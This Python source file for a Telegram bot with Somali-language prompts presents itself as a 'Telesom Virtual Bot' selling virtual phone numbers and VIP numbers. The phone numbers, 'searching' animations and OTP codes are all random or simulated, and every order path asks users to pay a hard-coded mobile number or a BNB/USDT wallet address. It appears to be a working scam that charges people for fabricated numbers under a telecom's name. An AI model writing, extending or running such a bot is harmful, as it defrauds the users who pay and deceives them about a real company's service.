import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7983838654"))

LOCAL_NUMBER = "+252907868526"
BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

logging.basicConfig(level=logging.INFO)

# ================= STORAGE =================
user_data = {}
pending_admin = {}

# ================= STATES =================
class CheckState(StatesGroup):
    waiting_code = State()

# ================= HELPERS =================
def normal_number():
    return "063" + "".join(str(random.randint(0, 9)) for _ in range(7))

def vip_number():
    digit = str(random.randint(4, 9))
    return "063" + digit*3 + str(random.randint(0,9)) + digit*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def animation(msg, text, sec=5):
    for i in range(sec):
        dots = "." * ((i % 4) + 1)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order"),
                   KeyboardButton(text="Check Code")]],
        resize_keyboard=True
    )
    await msg.answer(
        "Ku soo dhawoow Telesom Virtual Bot 🤖\nDooro adeeg:",
        reply_markup=kb
    )

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro nooca:", reply_markup=kb)

# ================= VIRTUAL =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    number = normal_number()
    user_data[call.from_user.id] = {
        "type": "virtual",
        "number": number,
        "price": "$1"
    }

    msg = await call.message.edit_text("NUMBER Searching")
    await animation(msg, "NUMBER Searching", 5)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_virtual")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])

    await msg.edit_text(
        f"Number Found ✅\n+252{number}\nPrice: $1\n\nRiix CONFIRM",
        reply_markup=kb
    )

# ================= CARD =================
@dp.callback_query(F.data == "card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data == "normal")
async def normal_card(call: CallbackQuery):
    number = normal_number()
    user_data[call.from_user.id] = {
        "type": "card",
        "level": "normal",
        "number": number,
        "price": "$1"
    }
    await show_payment_options(call)

@dp.callback_query(F.data == "vip")
async def vip_card(call: CallbackQuery):
    number = vip_number()
    user_data[call.from_user.id] = {
        "type": "card",
        "level": "vip",
        "number": number,
        "price": "$15"
    }
    await show_payment_options(call)

async def show_payment_options(call):
    data = user_data[call.from_user.id]
    msg = await call.message.edit_text("NUMBER Searching")
    await animation(msg, "NUMBER Searching", 5)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="crypto")]
    ])

    await msg.edit_text(
        f"Number: +252{data['number']}\nPrice: {data['price']}\n\nDooro Payment Method:",
        reply_markup=kb
    )

# ================= PAYMENT =================
@dp.callback_query(F.data == "local")
async def local_payment(call: CallbackQuery):
    await call.message.edit_text(
        f"PLEASE SEND MONEY 💵\n{LOCAL_NUMBER}"
    )
    await request_admin(call.from_user.id)

@dp.callback_query(F.data == "crypto")
async def crypto_payment(call: CallbackQuery):
    text = (
        "Send Crypto:\n\n"
        f"BNB:\n`{BNB_ADDRESS}`\n\n"
        f"USDT-BEP20:\n`{USDT_ADDRESS}`\n\n"
        "Taabo address-ka si aad u copy gareyso."
    )
    await call.message.edit_text(text, parse_mode="Markdown")
    await request_admin(call.from_user.id)

# ================= CONFIRM VIRTUAL =================
@dp.callback_query(F.data == "confirm_virtual")
async def confirm_virtual(call: CallbackQuery):
    msg = await call.message.edit_text("OTP Searching")
    await animation(msg, "OTP Searching", 5)

    code = generate_code()
    user_data[call.from_user.id]["code"] = code
    pending_admin[call.from_user.id] = True

    await request_admin(call.from_user.id)

    await asyncio.sleep(5)
    if pending_admin.get(call.from_user.id):
        await call.message.answer(
            f"PLEASE SEND MONEY 💵\n{LOCAL_NUMBER}"
        )

# ================= ADMIN =================
async def request_admin(user_id):
    data = user_data[user_id]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="APPROVE", callback_data=f"approve_{user_id}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{user_id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"New Order\nUser: {user_id}\nData: {data}",
        reply_markup=kb
    )

@dp.callback_query(F.data.startswith("approve_"))
async def approve(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    pending_admin[uid] = False
    code = user_data[uid].get("code", generate_code())
    user_data[uid]["code"] = code
    await bot.send_message(uid, f"Payment Confirmed ✅\nOTP Code: {code}")
    await call.message.edit_text("Approved ✅")

@dp.callback_query(F.data.startswith("reject_"))
async def reject(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    pending_admin[uid] = False
    await bot.send_message(uid, "Order Rejected ❌")
    await call.message.edit_text("Rejected ❌")

# ================= CHECK CODE =================
@dp.message(F.text == "Check Code")
async def check_code(msg: Message, state: FSMContext):
    await msg.answer("Geli OTP Code:")
    await state.set_state(CheckState.waiting_code)

@dp.message(CheckState.waiting_code)
async def verify_code(msg: Message, state: FSMContext):
    code = msg.text.strip()
    if user_data.get(msg.from_user.id, {}).get("code") == code:
        number = user_data[msg.from_user.id].get("number", "N/A")
        await msg.answer(f"Code Confirmed ✅\nNumber: +252{number}")
    else:
        await msg.answer("Code invalid ❌")
    await state.clear()

# ================= CANCEL =================
@dp.callback_query(F.data == "cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

# ================= RUN =================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
